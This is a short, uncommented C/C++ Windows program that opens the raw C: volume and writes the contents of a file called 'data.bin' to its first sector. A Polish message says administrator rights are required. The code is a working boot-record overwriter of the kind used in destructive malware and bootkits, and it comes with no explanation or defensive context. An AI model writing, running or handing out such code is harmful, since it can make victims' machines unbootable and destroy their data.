#include <windows.h>
#include <conio.h>
#include <stdio.h>

int main(){
    DWORD dw;
    char *pathToBin = "data.bin";
    HANDLE drive = CreateFile("\\\\.\\C:", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    if (drive != INVALID_HANDLE_VALUE){
        HANDLE binary = CreateFile(pathToBin, GENERIC_READ, 0, 0, OPEN_EXISTING, 0, 0);
        if (binary != INVALID_HANDLE_VALUE){
            DWORD size = GetFileSize(binary, 0);
            if (size > 0){
                byte *mbr = new byte[size];
                if (ReadFile(binary, mbr, size, &dw, 0)){
                    printf("A!\n");
                    //ok,not lets write the contents of the binary file,to the first sector of the drive
                    if (WriteFile(drive, mbr, size, &dw, 0)){
                        printf("B!\n");
                    }
                    else
                        printf("C!\n");
                }
                else
                    printf("D!\n");
            }
            else
                printf("E!\n");
        }
        else{
            printf("F!\n");
        }
        CloseHandle(binary);
    }
    else
        printf("Wymagany administrator\n");
    CloseHandle(drive);
    _getch();
}
